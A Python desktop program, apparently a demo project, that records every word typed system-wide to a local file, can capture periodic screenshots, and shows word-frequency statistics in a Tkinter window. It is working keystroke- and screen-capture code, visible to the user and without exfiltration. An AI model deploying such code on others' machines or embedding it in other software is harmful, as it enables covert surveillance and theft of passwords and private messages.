import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
from collections import Counter
from prettytable import PrettyTable
from PIL import ImageGrab
import threading
import time

typed_words = []
current_word = ""
listener = None
logging = False
screenshot_running = False

# Log writer
def write(text):
    try:
        with open("keylogger.txt", 'a') as f:
            f.write(text)
    except Exception as e:
        print(f"Write error: {e}")

# Key press handler
def on_key_press(Key):
    global current_word, typed_words

    try:
        if hasattr(Key, 'char') and Key.char is not None:
            current_word += Key.char
        elif Key == keyboard.Key.space or Key == keyboard.Key.enter:
            if current_word.strip():
                typed_words.append(current_word.strip())
                write(current_word.strip() + " ")
                current_word = ""
    except Exception as e:
        print(f"Key press error: {e}")

# Key release handler
def on_key_release(Key):
    if Key == keyboard.Key.esc:
        stop_logging()
        return False

# Screenshot thread
def take_screenshots():
    count = 1
    global screenshot_running
    screenshot_running = True
    while screenshot_running:
        try:
            screenshot = ImageGrab.grab()
            filename = f"screenshot_{count}.png"
            screenshot.save(filename)
            count += 1
            time.sleep(10)
        except Exception as e:
            print(f"Screenshot error: {e}")
            break

# Start keylogger
def start_logging():
    global listener, logging
    if logging:
        return
    logging = True
    output_text.insert(tk.END, "Keylogger started...\n")

    with open("keylogger.txt", "w"):  # clear previous logs
        pass

    listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    listener.start()

    if screenshot_checkbox_var.get():
        threading.Thread(target=take_screenshots, daemon=True).start()

# Stop keylogger
def stop_logging():
    global logging, screenshot_running
    if not logging:
        return
    logging = False
    screenshot_running = False
    output_text.insert(tk.END, "Keylogger stopped.\n")
    show_analysis()

# Show analysis
def show_analysis():
    try:
        with open("keylogger.txt", 'r') as f:
            data = f.read()
    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found!")
        return

    words = data.split()
    total_words = len(words)
    word_count = Counter(words)

    table = PrettyTable()
    table.field_names = ["Word", "Frequency"]
    for word, count in word_count.most_common(10):
        table.add_row([word, count])

    output_text.insert(tk.END, f"\nTotal Words Typed: {total_words}")
    output_text.insert(tk.END, f"\nUnique Words Used: {len(word_count)}\n")
    output_text.insert(tk.END, f"\nTop 10 Words:\n{table}\n")

# GUI setup
root = tk.Tk()
root.title("Python Keylogger with GUI")
root.geometry("700x500")

start_button = tk.Button(root, text="Start Keylogger", command=start_logging, bg="green", fg="white", font=("Arial", 12))
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_logging, bg="red", fg="white", font=("Arial", 12))
stop_button.pack(pady=5)

screenshot_checkbox_var = tk.BooleanVar()
screenshot_checkbox = tk.Checkbutton(root, text="Enable Screenshots", variable=screenshot_checkbox_var, font=("Arial", 11))
screenshot_checkbox.pack()

output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20, font=("Courier", 10))
output_text.pack(padx=10, pady=10)

root.mainloop()
